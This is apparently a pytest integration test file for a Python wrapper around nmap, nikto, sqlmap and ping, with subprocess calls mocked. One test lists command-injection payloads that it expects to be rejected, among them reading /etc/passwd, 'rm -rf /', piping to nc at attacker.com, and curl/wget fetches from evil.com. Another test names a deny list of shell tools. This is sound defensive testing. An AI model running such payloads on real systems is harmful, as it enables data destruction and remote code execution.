"""Integration tests that validate end-to-end functionality safely."""

import pytest
from unittest.mock import patch, Mock
import subprocess
from main import (
    nmap_scan, nikto_scan, sqlmap_scan, ping_scan, ALLOWED_TOOLS
)


class TestEndToEndIntegration:
    """Test complete tool execution workflows."""
    
    def test_nmap_integration_workflow(self, mock_subprocess_run):
        """Test complete nmap scan workflow from input to output."""
        # Mock successful nmap execution
        mock_subprocess_run.return_value = Mock(
            stdout="Nmap scan report for example.com\n80/tcp open http",
            stderr="",
            returncode=0
        )
        
        target = "example.com"
        result = nmap_scan(target)
        
        # Verify the complete workflow
        assert "Nmap scan report" in result
        assert "example.com" in result
        mock_subprocess_run.assert_called_once_with(
            ['nmap', '-Pn', target],
            capture_output=True,
            text=True,
            timeout=120
        )
    
    def test_sqlmap_integration_workflow(self, mock_subprocess_run):
        """Test complete sqlmap scan workflow."""
        # Mock sqlmap execution with typical output
        mock_subprocess_run.return_value = Mock(
            stdout="[INFO] testing connection to the target URL\n[INFO] checking if the target is protected",
            stderr="",
            returncode=0
        )
        
        target = "http://example.com/vulnerable.php?id=1"
        result = sqlmap_scan(target)
        
        # Verify sqlmap-specific workflow
        assert "testing connection" in result
        mock_subprocess_run.assert_called_once_with(
            ['sqlmap', '-u', target, '--batch'],
            capture_output=True,
            text=True,
            timeout=120
        )
    
    def test_ping_integration_workflow(self, mock_subprocess_run):
        """Test complete ping workflow."""
        # Mock ping execution
        mock_subprocess_run.return_value = Mock(
            stdout="PING example.com (93.184.216.34): 56(84) bytes of data.\n64 bytes from example.com",
            stderr="",
            returncode=0
        )
        
        target = "example.com"
        result = ping_scan(target)
        
        # Verify ping workflow
        assert "PING" in result
        mock_subprocess_run.assert_called_once_with(
            ['ping', '-c', '4', target],
            capture_output=True,
            text=True,
            timeout=120
        )


class TestErrorHandlingIntegration:
    """Test how the system handles various error conditions."""
    
    def test_tool_not_found_error(self, mock_subprocess_run):
        """Test handling when a tool is not installed."""
        mock_subprocess_run.side_effect = FileNotFoundError("nmap: command not found")
        
        result = nmap_scan("example.com")
        assert "Error running nmap:" in result
        assert "command not found" in result
    
    def test_tool_timeout_error(self, mock_subprocess_run):
        """Test handling when a tool times out."""
        mock_subprocess_run.side_effect = subprocess.TimeoutExpired("nmap", 120)
        
        result = nmap_scan("example.com")
        assert "Error running nmap:" in result
        assert "timed out" in result
    
    def test_tool_permission_error(self, mock_subprocess_run):
        """Test handling when a tool lacks permissions."""
        mock_subprocess_run.side_effect = PermissionError("Permission denied")
        
        result = nmap_scan("example.com")
        assert "Error running nmap:" in result
        assert "Permission denied" in result
    
    def test_tool_returns_error_code(self, mock_subprocess_run):
        """Test handling when a tool returns non-zero exit code."""
        mock_subprocess_run.return_value = Mock(
            stdout="",
            stderr="Error: Invalid target specified",
            returncode=1
        )
        
        result = nmap_scan("invalid_target")
        # Should still return the output even with error code
        assert "Error: Invalid target specified" in result


class TestSecurityIntegration:
    """Test security features in integration scenarios."""
    
    def test_command_injection_prevention_integration(self):
        """Test that command injection is prevented in realistic scenarios."""
        malicious_inputs = [
            "127.0.0.1; cat /etc/passwd",
            "example.com && rm -rf /",
            "127.0.0.1 | nc attacker.com 1234",
            "$(curl evil.com/malware.sh)",
            "`wget evil.com/backdoor`",
            "127.0.0.1\nmalicious_command",
            "127.0.0.1\rmalicious_command"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError, match="Invalid target: contains dangerous characters"):
                nmap_scan(malicious_input)
    
    def test_tool_whitelist_enforcement(self):
        """Test that only whitelisted tools can be executed."""
        from main import run_tool
        
        # Test allowed tools work
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(stdout="", stderr="", returncode=0)
            for tool in ALLOWED_TOOLS:
                result = run_tool(tool, ["--help"])
                assert isinstance(result, str)
        
        # Test disallowed tools are rejected
        dangerous_tools = ["rm", "mv", "bash", "sh", "python", "nc"]
        for dangerous_tool in dangerous_tools:
            with pytest.raises(ValueError, match="Tool not allowed"):
                run_tool(dangerous_tool, ["malicious_args"])
    
    def test_argument_isolation(self, mock_subprocess_run):
        """Test that tool arguments are properly isolated."""
        mock_subprocess_run.return_value = Mock(stdout="test", stderr="", returncode=0)
        
        # Test that arguments are passed as separate list items
        nmap_scan("example.com")
        
        called_args = mock_subprocess_run.call_args[0][0]
        assert called_args == ['nmap', '-Pn', 'example.com']
        # Verify no shell interpretation
        assert not any(';' in arg or '&' in arg or '|' in arg for arg in called_args)


class TestToolSpecificIntegration:
    """Test tool-specific integration scenarios."""
    
    @pytest.mark.parametrize("tool_func,expected_cmd_start", [
        (nmap_scan, ['nmap', '-Pn']),
        (nikto_scan, ['nikto', '-h']),
        (sqlmap_scan, ['sqlmap', '-u']),
        (ping_scan, ['ping', '-c', '4'])
    ])
    def test_tool_command_construction(self, tool_func, expected_cmd_start, mock_subprocess_run):
        """Test that each tool constructs commands correctly."""
        mock_subprocess_run.return_value = Mock(stdout="test", stderr="", returncode=0)
        
        if tool_func == sqlmap_scan:
            target = "http://example.com"
        else:
            target = "example.com"
        
        tool_func(target)
        
        called_cmd = mock_subprocess_run.call_args[0][0]
        for i, expected_part in enumerate(expected_cmd_start):
            assert called_cmd[i] == expected_part
        
        # Verify target is included
        assert target in called_cmd
    
    def test_output_formatting_consistency(self, mock_subprocess_run):
        """Test that all tools format output consistently."""
        test_stdout = "Tool output here"
        test_stderr = "Tool stderr here"
        
        mock_subprocess_run.return_value = Mock(
            stdout=test_stdout,
            stderr=test_stderr,
            returncode=0
        )
        
        tools_to_test = [nmap_scan, nikto_scan, ping_scan]
        
        for tool_func in tools_to_test:
            if tool_func == sqlmap_scan:
                result = tool_func("http://example.com")
            else:
                result = tool_func("example.com")
            
            # All tools should combine stdout and stderr
            assert test_stdout in result
            assert test_stderr in result
            assert result == f"{test_stdout}\n{test_stderr}"